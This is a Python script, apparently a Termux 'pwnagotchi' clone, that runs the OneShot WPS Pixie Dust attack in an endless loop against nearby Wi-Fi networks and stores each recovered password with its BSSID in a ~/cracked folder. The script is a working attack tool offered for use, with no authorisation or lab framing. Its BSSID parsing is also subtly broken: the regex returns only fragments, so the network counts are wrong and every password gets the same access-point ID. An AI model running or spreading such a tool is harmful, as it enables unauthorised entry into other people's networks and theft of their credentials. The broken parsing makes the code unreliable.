#!/usr/bin/env python3
"""
pwnagotchi-like Termux app using normal OneShot
All code in one file. Python 3.9+
Features:
  - Continuous attack cycle via `sudo oneshot -i wlan0 -K`
  - Session counters: total networks seen, total cracked
  - ASCII pet face reflecting success/failure per cycle
  - Save each cracked credential in ~/cracked
"""
import os
import sys
import subprocess
import time
import re
from datetime import datetime

# ASCII face module
class Face:
    states = {
        'neutral': [r"  -   -  ", r" ( o   o )", r"   \___/  "],
        'happy':   [r"  ^   ^  ", r" ( o ^ o )", r"   \___/  "],
        'sad':     [r"  -   -  ", r" ( o . o )", r"   \___/  "]
    }

    def __init__(self): self.state = 'neutral'
    def set_state(self, s):
        if s in Face.states: self.state = s
    def draw(self):
        for line in Face.states[self.state]: print(line)

# Config
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5  # seconds between attack cycles
ONESHOT_CMD = 'oneshot'

os.makedirs(CRACKED_DIR, exist_ok=True)

# Helpers
def run_oneshot():
    cmd = ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-K']
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
        return proc.stdout + proc.stderr
    except Exception as e:
        return f"[!] OneShot error: {e}"

def parse_output(output):
    # Count unique BSSIDs
    bssids = set(re.findall(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', output))
    # Find all PSKs
    passwords = re.findall(r'PSK:\s*(\S+)', output)
    return len(bssids), passwords

def save_crack(bssid, password):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{ts}_{bssid.replace(':','')}.txt"
    path = os.path.join(CRACKED_DIR, fname)
    with open(path, 'w') as f:
        f.write(f"BSSID: {bssid}\nPassword: {password}\n")
    print(f"[+] Saved crack to {path}")

# Main loop
def main():
    if os.geteuid() != 0:
        print("[!] Run as root (tsu)")
        sys.exit(1)

    face = Face()
    total_scanned = 0
    total_cracked = 0

    print("Pwnagotchi-Termux starting...")
    face.draw()

    while True:
        output = run_oneshot()
        scanned, pw_list = parse_output(output)
        total_scanned += scanned
        new_cracks = len(pw_list)
        total_cracked += new_cracks

        # Update face state
        face.set_state('happy' if new_cracks else 'sad')
        os.system('clear')
        face.draw()
        print(f"Scanned this cycle: {scanned} | Total scanned: {total_scanned}")
        print(f"Cracked this cycle: {new_cracks} | Total cracked: {total_cracked}")

        # Save each new crack
        for pwd in pw_list:
            # Associate each PSK with a BSSID placeholder (could improve parsing)
            bssid = pw_list and re.findall(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', output)[0] or 'unknown'
            save_crack(bssid, pwd)

        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__': main()
